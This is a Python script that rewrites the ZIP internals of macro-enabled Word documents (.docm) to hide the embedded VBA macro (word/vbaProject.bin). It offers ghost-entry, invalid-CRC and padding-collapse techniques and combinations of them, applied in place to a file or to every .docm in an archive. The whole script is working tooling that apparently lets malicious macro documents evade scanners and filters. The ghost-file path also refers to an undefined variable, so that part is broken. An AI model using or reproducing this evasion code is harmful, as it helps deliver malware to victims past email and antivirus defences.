#!/usr/bin/python3

import sys
import os
import zipfile
from random import randrange
        
class ObfuscateDocm:
    
    def __init__(self, filename):
        self.filename = filename
        #f = open(self.filename, "rb")
        with open(self.filename, "rb") as f:
            self.rawbytes = f.read()
        self.metadata = {}
        self.metadata['CDFH_offsets'] = self.get_CDFH_offsets()
        self.metadata['LFH_offsets'] = self.get_LFH_offsets()
        self.metadata['end_of_CDFH_offset'] = self.get_end_of_CDFH_offset()
        
    def obfuscate_file(self, obfuscation_method):
        if obfuscation_method == 'buffer_collapse':
            return self.obfuscate_collapse()
        elif obfuscation_method == 'ghost_file':
            return self.obfuscate_ghost()
        elif obfuscation_method == 'invalid_header':
            return self.obfuscate_IH()
        elif obfuscation_method == 'invalid_plus_ghost':
            self.rawbytes = self.obfuscate_ghost()
            return self.obfuscate_IH()
        elif obfuscation_method == 'invalid_plus_buffer':
            self.rawbytes = self.obfuscate_IH()
            return self.obfuscate_collapse()

    def get_CDFH_offsets(self):
        rawbytes = self.rawbytes
        offsets = []

        CDFH_magic = b'\x50\x4b\x01\x02'
        filename_len_offset = 28
        filename_offset = 46
        start_ind = 0
        while(start_ind < len(rawbytes)):
            if rawbytes[start_ind:].find(CDFH_magic) == -1:
                break
            else:
                CDFH_magic_ind = start_ind + rawbytes[start_ind:].find(CDFH_magic)
            filename_len = int.from_bytes(rawbytes[CDFH_magic_ind+filename_len_offset:CDFH_magic_ind+filename_len_offset+2], "little")
            filename_ind = CDFH_magic_ind + filename_offset
            filename = rawbytes[filename_ind:filename_ind+filename_len].decode('latin-1')
            offsets.append([CDFH_magic_ind, filename])
            start_ind = CDFH_magic_ind+1
            
        return offsets

    def get_LFH_offsets(self):
        filename = self.filename
        offsets = []

        metadata_len = 30
        z = zipfile.ZipFile(filename, "r")
        for filename in z.namelist(  ):
            zi = z.getinfo(filename)
            bt = z.read(filename)
            offsets.append([zi.header_offset, filename, zi.compress_size])
        z.close()
        return offsets

    def get_end_of_CDFH_offset(self):
        end_magic = b'\x50\x4b\x05\x06'
        return self.rawbytes.find(end_magic)
    
    def obfuscate_ghost(self):
        rawbytes = self.rawbytes
        metadata = self.metadata

        macro_CDFH_ind = [i for i, j in enumerate(metadata['CDFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
        macro_CDFH_offset = metadata['CDFH_offsets'][macro_CDFH_ind][0]

        # if the macro's CDFH was not the last one, then skip over it and continue with next CDFH
        if macro_CDFH_ind != len(simple.metadata['CDFH_offsets']) - 1:
            next_CDFH_offset = metadata['CDFH_offsets'][macro_CDFH_ind + 1][0]
            new_outbytes = rawbytes[:macro_CDFH_offset] + rawbytes[next_CDFH_offset:]
        # if it was the last one, then skip over it and continue with the end_of_CDFH
        else:
            new_outbytes = rawbytes[:macro_CDFH_offset] + rawbytes[metadata['end_of_CDFH_offset']:]

        return new_outbytes
    
    def obfuscate_IH(self):
        rawbytes = self.rawbytes
        metadata = self.metadata

        macro_ind = [i for i,j in enumerate(metadata['CDFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
        macro_LFH_offset = metadata['LFH_offsets'][macro_ind][0]

        # add invalid CRC in the LFH - 4 random bytes
        LFH_CRC_offset = 14
        new_outbytes = bytearray(rawbytes[:macro_LFH_offset + LFH_CRC_offset])
        random_CRC = randrange(4294967295) #random from 0 to max int that fits in 4 bytes
        new_outbytes.extend(random_CRC.to_bytes(4, 'little'))
        
        # extend to end
        new_outbytes.extend(bytearray(rawbytes[(macro_LFH_offset + LFH_CRC_offset + 4):]))
        
        return new_outbytes

    def obfuscate_collapse(self):
        total_Bs = 40
        metadata = self.metadata
        rawbytes = self.rawbytes

        macro_ind = [i for i,j in enumerate(metadata['CDFH_offsets']) if j[1] == 'word/vbaProject.bin'][0]
        macro_LFH_offset = metadata['LFH_offsets'][macro_ind][0]
        compressed_size = metadata['LFH_offsets'][macro_ind][2]
        new_outbytes = bytearray(rawbytes[:macro_LFH_offset+14]) #Get current buffer up to the CRC spot for the macro
        # add random CRC - 4 random bytes
        for i in range(4):
            new_outbytes.append(20)
        # add new compressed size
        new_size = compressed_size + total_Bs
        new_outbytes.extend(new_size.to_bytes(4, 'little'))
        lfh_filename_offset = 30
        new_outbytes.extend(bytearray(rawbytes[macro_LFH_offset+22:macro_LFH_offset+lfh_filename_offset]))

        # change filename to something random (same length so we don't have to change File name length)
        new_name = "19_char_file0000000"
        new_outbytes.extend(bytearray(new_name.encode()))
        next_LFH_offset = metadata['LFH_offsets'][macro_ind+1][0]
        if next_LFH_offset != (macro_LFH_offset + lfh_filename_offset + len(new_name) + compressed_size):
            print(next_LFH_offset)
            print(macro_LFH_offset+lfh_filename_offset+len(new_name)+compressed_size)
            print('accounting for LFH extra field')
            new_outbytes.extend(bytearray(rawbytes[macro_LFH_offset+lfh_filename_offset+len(new_name):next_LFH_offset]))

        # now embed the original compressed macro within Bs
        B_str = "B"*(total_Bs // 2)
        new_outbytes.extend(bytearray(B_str.encode()))
        full_macro_LFH = bytearray(rawbytes[macro_LFH_offset:next_LFH_offset])
        new_outbytes.extend(full_macro_LFH)
        new_outbytes.extend(bytearray(B_str.encode()))

        # add the dummy CRC in the macro's original CDFH entry
        macro_CDFH_offset = metadata['CDFH_offsets'][macro_ind][0]
        cdfh_crc_offset = 16
        new_outbytes.extend(bytearray(rawbytes[next_LFH_offset:macro_CDFH_offset+cdfh_crc_offset]))
        for i in range(4):
            new_outbytes.append(20)

        # need to fix the macro's original CDFH compressed size to account for the Bs (cdfh_compressed_size_offset = 20, so it's right here)
        new_outbytes.extend(new_size.to_bytes(4, 'little'))

        # need to change the original macro filename (word/vbaProject.bin) to the dummy one in CDFH
        cdfh_filename_offset = 46
        new_outbytes.extend(bytearray(rawbytes[macro_CDFH_offset+cdfh_crc_offset+8:macro_CDFH_offset+cdfh_filename_offset]))
        new_outbytes.extend(bytearray("19_char_file0000000".encode()))

        # curr_index = macro_CDFH_offset+cdfh_filename_offset+len(new_name)
        cdfh_pointer_to_LFH_offset = 42
        # now every pointer to LFH for all other files AFTER the original macro's CDFH needs to be offset by the # of Bs we added
        for i in range(macro_ind+1,len(metadata['CDFH_offsets'])):
            cdfh_offset = metadata['CDFH_offsets'][i][0]
            new_outbytes.extend(bytearray(rawbytes[cdfh_offset:cdfh_offset+cdfh_pointer_to_LFH_offset]))
            new_LFH_offset = metadata['LFH_offsets'][i][0] + total_Bs
            new_outbytes.extend(new_LFH_offset.to_bytes(4, 'little'))
            # now just extend to the usual end (which may include extra field/file comments)
            if i != len(metadata['CDFH_offsets'])-1:
                next_cdfh_offset = metadata['CDFH_offsets'][i+1][0]
                new_outbytes.extend(bytearray(rawbytes[(cdfh_offset+cdfh_pointer_to_LFH_offset+4):next_cdfh_offset]))
            else:
                #if last CDFH, extend to end of central directory header
                new_outbytes.extend(bytearray(rawbytes[(cdfh_offset+cdfh_pointer_to_LFH_offset+4):metadata['end_of_CDFH_offset']]))

        # now add in the new CDFH pointing to the embedded macro
        # should be a direct copy of the original macro's CDFH, except with the pointer to LFH modified
        new_outbytes.extend(bytearray(rawbytes[macro_CDFH_offset:macro_CDFH_offset + cdfh_pointer_to_LFH_offset]))
        new_LFH_offset = macro_LFH_offset + (total_Bs // 2)
        new_outbytes.extend(new_LFH_offset.to_bytes(4, 'little'))
        CDFH_after_macro_offset = metadata['CDFH_offsets'][macro_ind + 1][0]
        new_outbytes.extend(bytearray(rawbytes[(macro_CDFH_offset + cdfh_pointer_to_LFH_offset + 4):CDFH_after_macro_offset]))

        # Finally, add in the End of Central Directory header
        end_of_central_directory_offset = metadata['end_of_CDFH_offset']
        new_outbytes.extend(bytearray(rawbytes[end_of_central_directory_offset:]))

        return new_outbytes


def obfuscate(in_file, technique):
	# If file is .docm, perform obfuscation directly
    if in_file[-5:] == '.docm':
        docm = ObfuscateDocm(in_file)
        obfuscated = docm.obfuscate_file(technique)
        with open(in_file, 'wb') as f:
            f.write(bytearray(obfuscated))
            
	# If file is .zip, extract and perform obfuscation on each .docm
    else:
        z = zipfile.ZipFile(in_file, "r")
        filenames = z.namelist(  )
        for filename in filenames:
            z.extract(filename)
            if '.docm' in filename:
                ob_m = ObfuscateDocm(filename)
                os.remove(filename)
                obfuscated = ob_m.obfuscate_file(technique)
                with open(filename, 'wb') as f:
                    f.write(bytearray(obfuscated))
        z.close()
        os.remove(in_file)
        zw = zipfile.ZipFile(in_file, "w")
        for filename in filenames:
            zw.write(filename)
        zw.close()
        for filename in filenames:
            if '.docm' not in filename:
                os.remove(filename)


def main(argv):
    usage = '''
    python script.py <in_file> <obfuscation_technique>
    
    in_file must be .docm or .zip
    obfuscation_techniques: buffer_collapse, ghost_file, invalid_header, invalid_plus_buffer, invalid_plus_ghost
    
    make this usage nicer
    '''
    
    if len(argv) < 2 or len(argv) > 3:
        print(usage)
        sys.exit(2)
    if len(argv) == 2 and argv[1] == '-h':
        print(usage)
        sys.exit(2)
	
    in_file = argv[1]
    if in_file[-5:] != '.docm' and in_file[-4:] != '.zip':
        print('input must be .docm or .zip')
        sys.exit(2)

    if len(argv) > 2:
        technique = argv[2]
    else:
	    technique = 'buffer_collapse'
    
    obfuscate(in_file, technique)
		

if __name__ == "__main__":
    main(sys.argv)